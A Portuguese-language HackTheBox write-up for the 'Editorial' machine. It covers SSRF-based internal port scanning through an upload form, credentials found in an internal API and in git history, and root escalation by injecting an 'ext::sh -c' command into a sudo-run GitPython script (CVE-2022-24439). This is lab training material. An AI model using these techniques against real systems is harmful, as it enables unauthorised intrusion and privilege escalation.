# Editorial

## Informações da Máquina

| Atributo | Valor |
|----------|-------|
| **Plataforma** | HackTheBox |
| **Dificuldade** | Easy |
| **OS** | Linux |
| **IP** | 10.10.11.20 |
| **Técnicas** | SSRF, Port Scanning, Git History Exploitation, CVE-2022-24439 |
| **Link HTB** | [https://app.hackthebox.com/machines/Editorial](https://app.hackthebox.com/machines/Editorial) |

## Resumo

Máquina Linux que explora SSRF através de um formulário de upload de imagens, permitindo enumerar portas internas e descobrir uma API. Credenciais obtidas via API levam a acesso SSH. Escalação de privilégios através de git history e exploração de CVE-2022-24439 em GitPython.

## Enumeration/Scanning

### Port Scanning

```bash
nmap -sVC -T4 -oN nmap.out -vv 10.10.11.20
```

**Portas abertas:**
- 22/tcp - SSH
- 80/tcp - HTTP

### Web Enumeration

Adicionado domínio ao `/etc/hosts`:
```bash
echo "10.10.11.20 editorial.htb" >> /etc/hosts
```

Descoberta de diretórios:
```bash
ffuf -c -t 100 -w ~/infosec/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://editorial.htb/FUZZ
```

**Diretórios encontrados:**
- `/about` - Status 200
- `/upload` - Status 200 (formulário de upload)

## Exploitation

### SSRF via Upload Form

O formulário em `/upload` aceita URLs para fazer fetch de imagens. Testando com `http://127.0.0.1`, recebemos resposta, indicando possível SSRF.

#### Port Scanning via SSRF

Utilizando BurpSuite Intruder para enumerar portas:

```http
POST /upload-cover HTTP/1.1
Host: editorial.htb
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryjpHEUChDAQT4gWEC

------WebKitFormBoundaryjpHEUChDAQT4gWEC
Content-Disposition: form-data; name="bookurl"

http://127.0.0.1:§port§
------WebKitFormBoundaryjpHEUChDAQT4gWEC--
```

**Resultado:** Porta 5000 retorna JSON com informações de API.

### API Discovery

Acessando `http://127.0.0.1:5000` via SSRF, descobrimos endpoints de API:

```json
{
  "messages": [...],
  "version": [...]
}
```

Navegando pelos endpoints descobertos em `/api/latest/metadata/messages/authors`, obtemos credenciais para o usuário `dev`.

### SSH Access

```bash
ssh dev@editorial.htb
cat user.txt
```

**User Flag:** ✓

## Privilege Escalation

### dev → prod

Enumerando o diretório home:

```bash
ls -la
# apps  user.txt

cd apps
ls -la
# .git directory found

cd .git
git log
```

Explorando histórico do Git:

```bash
git show 1e84a036b2f33c59e2390730699a488c65643d28
```

**Descoberta:** Credenciais do usuário `prod` no histórico de commits.

```bash
su prod
# usando senha encontrada no git history
```

### prod → root

Verificando permissões sudo:

```bash
sudo -l
# User prod may run the following commands on editorial:
#  (root) /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

Analisando o script:

```bash
cat /opt/internal_apps/clone_changes/clone_prod_change.py
```

O script usa `r.clone_from()` com opção `protocol.ext.allow=always`, vulnerável a **CVE-2022-24439** (GitPython RCE).

### Exploiting CVE-2022-24439

```bash
sudo /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::sh -c cat% /root/root.txt% >% /home/prod/root.txt"

cat /home/prod/root.txt
```

**Root Flag:** ✓

## Lições Aprendidas

- **SSRF** pode ser usado para port scanning e enumeração de serviços internos
- Sempre verificar **histórico do Git** em repositórios acessíveis - pode conter credenciais ou informações sensíveis
- **CVE-2022-24439** permite RCE através de URLs maliciosas em GitPython quando `ext::` protocol está habilitado
- API endpoints internos podem expor informações críticas

---

*Writeup by kp*
